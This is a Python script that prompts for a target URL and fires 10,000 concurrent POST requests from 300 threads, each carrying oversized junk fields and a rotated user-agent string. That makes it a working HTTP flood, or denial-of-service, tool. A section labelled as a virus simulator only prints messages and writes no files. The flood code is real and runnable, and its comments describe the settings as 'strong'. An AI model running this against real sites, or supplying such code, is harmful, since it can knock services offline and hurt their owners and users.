import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import requests

# -----------------------
# Config
# -----------------------
target_url = input("Enter target URL: ").strip()
requests_to_send = 10000  # Your original strong setting
max_workers = 300         # Your original strong setting
visible_logs = 100        # Your original strong setting

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
]

fake_payload = {
    "username": "admin" * 1000,
    "password": "pass123" * 1000,
    "data": "X" * 10000
}

# -----------------------
# Web request sender
# -----------------------
def send_post(i):
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json"
        }
        response = requests.post(target_url, json=fake_payload, headers=headers, timeout=3)
        if i < visible_logs:
            print(f"[{i+1}] Status: {response.status_code}")
    except requests.RequestException:
        if i < visible_logs:
            print(f"[{i+1}] ❌ Request failed")

# -----------------------
# Fake virus simulator
# -----------------------
def generate_payload():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=100))

def infect_file(file_path):
    print(f"[SIMULATION] Infecting file: {file_path}")
    payload = generate_payload()
    print(f"[SIMULATION] Writing fake payload to {file_path} (NOT ACTUALLY WRITTEN)")

def scan_and_infect():
    fake_files = [f"file_{i}.txt" for i in range(5)]
    for f in fake_files:
        infect_file(f)
        time.sleep(0.2)

def connect_to_command_center():
    print("[SIMULATION] Connecting to attacker server... (no real connection)")

# -----------------------
# Main runner
# -----------------------
def main():
    print("[SIMULATION] Virus started.")
    connect_to_command_center()
    scan_and_infect()
    print("[SIMULATION] Virus finished.")

    print(f"\n🚀 Sending {requests_to_send} requests to {target_url} (only showing first {visible_logs} logs)...")  
    start = time.time()  

    with ThreadPoolExecutor(max_workers=max_workers) as executor:  
        for i in range(requests_to_send):  
            executor.submit(send_post, i)  

    duration = round(time.time() - start, 2)  
    print(f"\n✅ Done sending {requests_to_send} requests in {duration} seconds.")

if __name__ == "__main__":
    main()
